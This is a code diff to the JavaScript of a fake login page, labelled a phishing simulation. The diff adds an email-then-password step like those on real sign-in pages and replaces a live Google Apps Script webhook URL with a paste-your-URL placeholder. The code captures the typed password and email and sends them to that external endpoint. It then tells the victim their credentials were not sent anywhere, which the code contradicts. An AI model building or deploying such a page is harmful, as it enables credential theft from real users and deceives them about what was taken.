@@ -2,11 +2,26 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 e.preventDefault(); // Stop the form from doing its default submit
 
 const email = document.getElementById('email').value;
+const passwordContainer = document.getElementById('passwordContainer');
+
+if (!email) {
+alert('Please enter your email.');
+return;
+}
+
+// Show the password field
+passwordContainer.style.display = 'block';
+
+// Change the button text to "Submit"
+document.querySelector('button[type="submit"]').textContent = 'Submit';
+
+// Add event listener to the submit button
+document.getElementById('submitButton').addEventListener('click', function() {
 const password = document.getElementById('password').value;
 
 // --- THIS IS THE IMPORTANT PART ---
 // Paste your Web App URL inside the quotes below.
-const webhookUrl = 'https://script.google.com/macros/s/AKfycbyXOLDwkcGTwAUbDTKPYCnQjUY6Svjs9kF2oqOlKgpc94XN1OSuecgQnmEdJ9cK-bCB/exec';
+const webhookUrl = 'PASTE_YOUR_WEB_APP_URL_HERE';
 
 // Prepare the data to be sent
 const data = {
@@ -33,5 +48,6 @@ alert('This was a phishing simulation. Your credentials were not sent anywhere.'
 console.error('Error:', error);
 // Still show the alert even if logging fails, so the user experience is the same.
 alert('This was a phishing simulation. Your credentials were not sent anywhere.');
+});
 });
 });
